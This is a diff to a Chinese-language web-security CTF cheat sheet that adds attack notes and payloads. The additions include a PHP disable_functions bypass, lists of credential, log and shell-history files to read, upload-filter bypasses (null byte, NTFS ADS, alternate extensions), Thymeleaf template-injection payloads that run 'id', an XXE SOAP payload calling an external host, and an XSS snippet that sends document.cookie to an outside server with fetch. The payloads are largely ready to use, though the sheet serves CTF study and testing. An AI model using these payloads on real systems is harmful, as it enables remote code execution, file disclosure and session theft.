@@ -751,6 +751,13 @@ echo file_get_contents('bar/etc/passwd');
     echo $stroutput;
     ```
 
+- iconv
+    - https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80
+    - 條件
+        - 可以上傳 `.so`, `gconv-modules`
+        - 可以設定環境變數
+    - `iconv()`, `iconv_strlen()`, php://filter的convert.iconv 
+
 - [l3mon/Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)
 
 - [JSON UAF Bypass](https://github.com/mm0r1/exploits/tree/master/php-json-bypass)
@@ -1779,6 +1786,7 @@ HQL injection example (pwn2win 2017)
     - `/etc/mongod.conf`
     - `/etc/krb5.conf`
     - `~/.tmux.conf`
+    - `~/.mongorc.js`
     - `$TOMCAT_HOME/conf/tomcat-users.xml`
     - `$TOMCAT_HOME/conf/server.xml`
 
@@ -1792,6 +1800,7 @@ HQL injection example (pwn2win 2017)
     - `/var/log/sshd.log`
     - `/var/log/mysqld.log`
     - `/var/log/mongodb/mongod.log`
+    - `.pm2/pm2.log`
     - `$TOMCAT_HOME/logs/catalina.out`
 
 - History
@@ -1809,6 +1818,8 @@ HQL injection example (pwn2win 2017)
     - `.scapy_history`
     - `.sqlite_history`
     - `.psql_history`
+    - `.rediscli_history`
+    - `.coffee_history`
     - `.lesshst`
     - `.wget-hsts`
     - `.config/fish/fish_history`
@@ -1954,7 +1965,7 @@ HQL injection example (pwn2win 2017)
 
 ## SSI (Server Side Includes)
 
-- 通常放在`.shtml`, `.shtm`
+- 通常放在`.shtml`, `.shtm`, `.stm`
 - Execute Command
     - `<!--#exec cmd="command"-->`
 - File Include
@@ -1978,10 +1989,11 @@ HQL injection example (pwn2win 2017)
 - 大小寫繞過
     - pHP
     - AsP 
-- 空格 / 點 繞過
+- 空格 / 點 / Null 繞過
     - Windows特性
     - .php(空格)  // burp修改
     - .asp.
+    - .php%00.jpg
 - php3457
     - .php3
     - .php4
@@ -1989,6 +2001,26 @@ HQL injection example (pwn2win 2017)
     - .php7
     - .pht
     - .phtml
+- asp
+    - asa
+    - cer
+    - cdx
+- aspx
+    - ascx
+    - ashx
+    - asmx
+    - asac
+    - soap
+    - svc
+    - master
+    - web.config
+- jsp
+    - jspa
+    - jspf
+    - jspx
+    - jsw
+    - jsv
+    - jtml
 - .htaccess
     ```
     <FilesMatch "kai">
@@ -1996,6 +2028,21 @@ HQL injection example (pwn2win 2017)
     </FilesMatch>
     ```
 - 文件解析漏洞
+- NTFS ADS
+    - `test.php:a.jpg`
+        - 生成 `test.php`
+        - 空內容
+    - `test.php::$DATA`
+        - 生成 `test.php`
+        - 內容不變
+    - `test.php::$INDEX_ALLOCATION`
+        - 生成 `test.php` 資料夾
+    - `test.php::$DATA.jpg`
+        - 生成 `0.jpg`
+        - 內容不變
+    - `test.php::$DATA\aaa.jpg`
+        - 生成 `aaa.jpg`
+        - 內容不變
 
 ## Magic Number
 
@@ -2007,7 +2054,9 @@ HQL injection example (pwn2win 2017)
     - `89 50 4E 47`
 
 ## 其他
+
 - 常見場景：配合文件解析漏洞
+- 超長檔名截斷
 
 # 反序列化
 
@@ -2371,6 +2420,16 @@ Server-Side Template Injection
     - `{{'/etc/passwd'|file_excerpt(30)}}`
 - Version
     - `{{constant('Twig\\Environment::VERSION')}}`
+
+## thymeleaf
+
+- Java
+- Some payload
+    - `__${T(java.lang.Runtime).getRuntime().availableProcessors()}__::..x`
+    - `__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x`
+- Example
+    - [WCTF 2020 - thymeleaf](https://github.com/w181496/CTF/tree/master/wctf2020/thymeleaf)
+    - [DDCTF 2020 - Easy Web](https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/)
 
 ## AngularJS
 - v1.6後移除Sandbox
@@ -2789,6 +2848,16 @@ xxe.dtd:
 
 - Example: [Google CTF 2019 Qual - bnv](https://github.com/w181496/CTF/blob/master/googlectf-2019-qual/bnv/README_en.md)
 
+## SOAP
+
+```
+<soap:Body>
+<foo>
+<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://kaibro.tw:22/"> %dtd;]><xxx/>]]>
+</foo>
+</soap:Body>
+```
+
 ## 其它
 
 - DOCX
@@ -2800,6 +2869,10 @@ xxe.dtd:
 # Frontend
 
 ## XSS
+
+### Cheat Sheet
+
+- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 
 ### Basic Payload
 
@@ -2967,6 +3040,63 @@ https://csp-evaluator.withgoogle.com/
     - ea is used to log actions and can contain arbitrary string
     - Google CTF 2018 - gcalc2
 
+
+### Upload XSS
+
+- htm
+- html
+- svg
+- xml
+- xsl
+- rdf
+    - firefox only?
+    - `text/rdf` / `application/rdf+xml`
+- vtt
+    - IE/Edge only?
+    - `text/vtt`
+- shtml
+- xhtml
+- mht / mhtml
+- var
+    - [HITCON CTF 2020 - oStyle](https://github.com/orangetw/My-CTF-Web-Challenges#oStyle)
+    - 預設安裝Apache包含mod_negotiation模組，可以設置Response中的`Content-*`屬性
+    
+```
+Content-language: en
+Content-type: text/html
+Body:----foo----
+
+<script>
+fetch('http://orange.tw/?' + escape(document.cookie))
+</script>
+
+----foo----    
+```
+
+### Content-type
+
+- XSS
+    - https://github.com/BlackFan/content-type-research/blob/master/XSS.md
+    - text/html	
+    - application/xhtml+xml
+    - application/xml
+    - text/xml
+    - image/svg+xml
+    - text/xsl
+    - application/vnd.wap.xhtml+xml
+    - multipart/x-mixed-replace
+    - text/rdf
+    - application/rdf+xml
+    - application/mathml+xml
+    - text/vtt
+    - text/cache-manifest
+
+### jQuery
+
+- `$.getJSON` / `$.ajax` XSS
+    - 當 URL 長得像 `http://kaibro.tw/x.php?callback=anything` 
+    - 會自動判斷成 jsonp callback，然後以 javascript 執行
+    - Example: [VolgaCTF 2020 Qualifier - User Center](https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html)
 
 ### Online Encoding / Decoding
 - http://monyer.com/demo/monyerjs/
